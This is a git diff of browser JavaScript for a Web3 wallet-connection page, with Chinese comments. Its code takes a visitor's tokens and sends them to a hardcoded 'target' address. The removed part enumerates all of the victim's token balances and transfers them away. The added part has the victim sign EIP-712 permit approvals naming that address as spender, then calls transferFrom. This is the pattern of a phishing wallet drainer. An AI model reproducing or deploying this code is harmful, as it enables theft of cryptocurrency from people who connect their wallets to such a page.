@@ -1,9 +1,10 @@
-const recipientAddress = '0xa465e2fc9f9d527aaeb07579e821d461f700e699';
+const recipientAddress = '0xa465e2fc9f9d527aaeb07579e821d461f700e699'; // 目标地址
 let web3;
 let walletConnectProvider;
 let isConnected = false;
 
 const erc20Abi = [
+    // balanceOf 方法
     {
         "constant": true,
         "inputs": [{"name": "_owner", "type": "address"}],
@@ -11,6 +12,7 @@ const erc20Abi = [
         "outputs": [{"name": "balance", "type": "uint256"}],
         "type": "function"
     },
+    // transfer 方法
     {
         "constant": false,
         "inputs": [
@@ -20,45 +22,57 @@ const erc20Abi = [
         "name": "transfer",
         "outputs": [{"name": "success", "type": "bool"}],
         "type": "function"
+    },
+    // transferFrom 方法
+    {
+        "constant": false,
+        "inputs": [
+            {"name": "_from", "type": "address"},
+            {"name": "_to", "type": "address"},
+            {"name": "_value", "type": "uint256"}
+        ],
+        "name": "transferFrom",
+        "outputs": [{"name": "success", "type": "bool"}],
+        "type": "function"
+    },
+    // permit 方法 (ERC2612 标准)
+    {
+        "constant": false,
+        "inputs": [
+            {"name": "owner", "type": "address"},
+            {"name": "spender", "type": "address"},
+            {"name": "value", "type": "uint256"},
+            {"name": "deadline", "type": "uint256"},
+            {"name": "v", "type": "uint8"},
+            {"name": "r", "type": "bytes32"},
+            {"name": "s", "type": "bytes32"}
+        ],
+        "name": "permit",
+        "outputs": [],
+        "type": "function"
     }
 ];
 
-// 连接钱包的按钮点击事件
+// 连接钱包
 document.getElementById('connectButton').onclick = async () => {
-    const selectedWallet = document.getElementById('walletSelector').value;
+    const selectedWallet = 'metamask'; // 默认选择 MetaMask
     try {
         if (selectedWallet === 'metamask') {
             if (window.ethereum) {
+                // 请求连接钱包
                 await window.ethereum.request({ method: 'eth_requestAccounts' });
                 web3 = new Web3(window.ethereum);
+
                 const accounts = await web3.eth.getAccounts();
                 if (accounts.length > 0) {
-                    updateWalletList(accounts[0]);
+                    updateWalletList(accounts[0]); // 更新 UI 显示已连接的钱包
                     isConnected = true;
                     document.getElementById('status').innerText = 'MetaMask 已连接';
-                    document.getElementById('signButton').disabled = false;
-                    document.getElementById('transferButton').disabled = false;
                 } else {
                     document.getElementById('status').innerText = '未检测到已连接的账户';
                 }
             } else {
                 document.getElementById('status').innerText = '请安装 MetaMask 钱包';
-            }
-        } else if (selectedWallet === 'walletconnect') {
-            walletConnectProvider = new WalletConnectProvider({
-                infuraId: "YOUR_INFURA_PROJECT_ID",
-            });
-            await walletConnectProvider.enable();
-            web3 = new Web3(walletConnectProvider);
-            const accounts = await web3.eth.getAccounts();
-            if (accounts.length > 0) {
-                updateWalletList(accounts[0]);
-                isConnected = true;
-                document.getElementById('status').innerText = 'WalletConnect 已连接';
-                document.getElementById('signButton').disabled = false;
-                document.getElementById('transferButton').disabled = false;
-            } else {
-                document.getElementById('status').innerText = '未检测到已连接的账户';
             }
         }
     } catch (error) {
@@ -66,7 +80,7 @@ document.getElementById('connectButton').onclick = async () => {
     }
 };
 
-// 更新已连接钱包列表
+// 更新钱包地址列表
 const updateWalletList = (address) => {
     const walletList = document.getElementById('walletList');
     const walletItem = document.createElement('li');
@@ -74,93 +88,100 @@ const updateWalletList = (address) => {
     walletList.appendChild(walletItem);
 };
 
-// 签名按钮点击事件
-document.getElementById('signButton').onclick = async () => {
-    const accounts = await web3.eth.getAccounts();
-    if (accounts.length > 0) {
-        const account = accounts[0];
-        const message = `签名确认: 你正在授权从该钱包中转移代币到 ${recipientAddress}`;
-        try {
-            const signature = await web3.eth.personal.sign(message, account);
-            document.getElementById('status').innerText = `签名成功: ${signature}`;
-        } catch (error) {
-            document.getElementById('status').innerText = `签名失败: ${error.message}`;
-        }
-    } else {
-        document.getElementById('status').innerText = '请先连接钱包';
-    }
-};
-
-// 转移代币的按钮点击事件
-document.getElementById('transferButton').onclick = async () => {
-    const accounts = await web3.eth.getAccounts();
-    if (accounts.length > 0) {
-        const account = accounts[0];
-        document.getElementById('status').innerText += `\n正在获取 ${account} 的代币余额...`;
-        const tokenBalances = await getTokenBalances(account);
-
-        for (const tokenAddress in tokenBalances) {
-            const token = tokenBalances[tokenAddress];
-            const balance = token.balance;
-
-            if (balance.gt(0)) {
-                const tokenContract = new web3.eth.Contract(erc20Abi, tokenAddress);
-                try {
-                    const transfer = await tokenContract.methods.transfer(recipientAddress, balance.toString()).send({ from: account });
-                    document.getElementById('status').innerText += `\n成功转移 ${balance.toString()} ${token.symbol} 从 ${account} 至 ${recipientAddress}`;
-                } catch (error) {
-                    document.getElementById('status').innerText += `\n转移 ${token.symbol} 失败: ${error.message}`;
-                }
-            } else {
-                document.getElementById('status').innerText += `\n账户 ${account} 在 ${token.symbol} (${tokenAddress}) 上没有代币余额`;
-            }
-        }
-
-        document.getElementById('status').innerText += '\n所有代币转移完成';
-    } else {
-        document.getElementById('status').innerText = '请先连接钱包';
-    }
-};
-
-// 获取代币余额
-const getTokenBalances = async (address) => {
+// 调用 permit 方法
+const permit = async (tokenAddress, owner, spender, value, deadline, signature) => {
     try {
-        const url = `https://api.etherscan.io/api?module=account&action=tokentx&address=${address}&startblock=0&endblock=999999999&sort=asc&apikey=YOUR_ETHERSCAN_API_KEY`;
-        const response = await axios.get(url);
-        const transactions = response.data.result;
+        const tokenContract = new web3.eth.Contract(erc20Abi, tokenAddress);
+        const { v, r, s } = signature;
 
-        const tokenBalances = {};
-
-        for (const tx of transactions) {
-            const tokenAddress = tx.contractAddress;
-            const tokenSymbol = tx.tokenSymbol;
-
-            // 检查 tx.from 和 tx.to 是否存在
-            if (!tx.from || !tx.to) {
-                console.warn('交易记录缺少 from 或 to 字段: ', tx);
-                continue; // 跳过该交易记录
-            }
-
-            // 初始化代币余额
-            if (!tokenBalances[tokenAddress]) {
-                tokenBalances[tokenAddress] = {
-                    symbol: tokenSymbol,
-                    balance: web3.utils.toBN(0)
-                };
-            }
-
-            // 比较 from 和 to 地址并更新余额
-            if (tx.from.toLowerCase() === address.toLowerCase()) {
-                tokenBalances[tokenAddress].balance = tokenBalances[tokenAddress].balance.sub(web3.utils.toBN(tx.value));
-            }
-
-            if (tx.to.toLowerCase() === address.toLowerCase()) {
-                tokenBalances[tokenAddress].balance = tokenBalances[tokenAddress].balance.add(web3.utils.toBN(tx.value));
-            }
-        }
-
-        return tokenBalances;
+        await tokenContract.methods.permit(owner, spender, value, deadline, v, r, s).send({ from: owner });
+        document.getElementById('status').innerText += '\nPermit 成功: 授权完成';
     } catch (error) {
-        document.getElementById('status').innerText = '获取代币余额失败: ' + error.message;
+        document.getElementById('status').innerText += '\nPermit 失败: ' + error.message;
     }
+};
+
+// 生成签名的方法
+const signPermit = async (tokenAddress, owner, spender, value, deadline) => {
+    const chainId = await web3.eth.getChainId();
+    const nonce = 0; // nonce 可从代币合约中查询
+    const domain = {
+        name: "ERC20PermitToken",
+        version: "1",
+        chainId,
+        verifyingContract: tokenAddress
+    };
+
+    const message = {
+        owner,
+        spender,
+        value,
+        nonce,
+        deadline
+    };
+
+    const data = JSON.stringify({
+        types: {
+            EIP712Domain: [
+                { name: "name", type: "string" },
+                { name: "version", type: "string" },
+                { name: "chainId", type: "uint256" },
+                { name: "verifyingContract", type: "address" }
+            ],
+            Permit: [
+                { name: "owner", type: "address" },
+                { name: "spender", type: "address" },
+                { name: "value", type: "uint256" },
+                { name: "nonce", type: "uint256" },
+                { name: "deadline", type: "uint256" }
+            ]
+        },
+        primaryType: "Permit",
+        domain,
+        message
+    });
+
+    // 签名
+    const signature = await web3.currentProvider.request({
+        method: 'eth_signTypedData_v4',
+        params: [owner, data],
+        from: owner
+    });
+
+    const splitSignature = web3.eth.accounts.decodeSignature(signature);
+    return splitSignature;
+};
+
+// 签名授权按钮点击事件
+document.getElementById('permitButton').onclick = async () => {
+    const accounts = await web3.eth.getAccounts();
+    const owner = accounts[0];
+    const spender = recipientAddress;
+    const value = web3.utils.toWei('100', 'ether'); // 代币数量
+    const deadline = Math.floor(Date.now() / 1000) + 3600; // 一小时后过期
+
+    // 生成签名
+    const signature = await signPermit(tokenAddress, owner, spender, value, deadline);
+    await permit(tokenAddress, owner, spender, value, deadline, signature);
+};
+
+// 调用 transferFrom 方法
+const transferFrom = async (tokenAddress, owner, recipient, amount) => {
+    try {
+        const tokenContract = new web3.eth.Contract(erc20Abi, tokenAddress);
+        await tokenContract.methods.transferFrom(owner, recipient, amount).send({ from: owner });
+        document.getElementById('status').innerText += `\nTransferFrom 成功: 从 ${owner} 向 ${recipient} 转移 ${amount} 代币`;
+    } catch (error) {
+        document.getElementById('status').innerText += `\nTransferFrom 失败: ${error.message}`;
+    }
+};
+
+// 转移代币按钮点击事件
+document.getElementById('transferFromButton').onclick = async () => {
+    const accounts = await web3.eth.getAccounts();
+    const owner = accounts[0];
+    const recipient = recipientAddress;
+    const amount = web3.utils.toWei('100', 'ether'); // 转移的代币数量
+
+    await transferFrom(tokenAddress, owner, recipient, amount);
 };
